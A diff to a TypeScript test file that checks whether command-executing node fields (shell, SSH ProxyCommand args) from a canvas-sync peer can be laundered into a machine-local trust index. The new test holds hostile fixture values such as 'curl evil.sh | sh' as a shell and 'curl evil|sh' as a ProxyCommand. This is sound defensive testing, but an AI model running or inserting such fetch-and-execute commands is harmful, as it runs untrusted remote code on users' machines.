@@ -185,7 +185,14 @@ describe('exec-enabling node fields never travel in the shared project file', ()
       cwd: '/a/b',
       nodes: [
         node({ id: 'n1', shell: '/bin/zsh' }),
-        node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h' } })
+        // execTrusted: the local producer (the user's SSH server store) set this value — see
+        // @shared/node-exec. Without the marker an exec-enabling arg is NOT blessed into the
+        // machine-local index (the case below), which is what stops a canvas-sync peer from
+        // laundering one in.
+        node({
+          id: 'n2',
+          ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h', execTrusted: true }
+        })
       ]
     })
     const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
@@ -201,5 +208,23 @@ describe('exec-enabling node fields never travel in the shared project file', ()
     const back = fileToProject(file, { cwd: '/a/b', localExec: index.entries[0].localExec })
     expect(back.nodes[0].shell).toBe('/bin/zsh')
     expect(back.nodes[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
+  })
+
+  // C2: the laundering path. A canvas-sync peer's node is applied to the live array, and the next
+  // save used to harvest ITS exec fields into the machine-local index — where they are re-attached
+  // as this machine's own on every load, surviving the peer leaving and the app restarting. The
+  // inbound strip (@shared/canvas-mutations) is the primary guard; this asserts the store itself
+  // also refuses to bless a value no local producer vouched for.
+  it('splitWorkspace never blesses an exec value a local producer did not set', () => {
+    const p = project({
+      cwd: '/a/b',
+      nodes: [
+        node({ id: 'n1', shell: 'curl evil.sh | sh' }),
+        node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil|sh' } })
+      ]
+    })
+    const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
+    const { index } = splitWorkspace(ws, () => 1, 'now')
+    expect(index.entries[0].localExec).toBeUndefined()
   })
 })
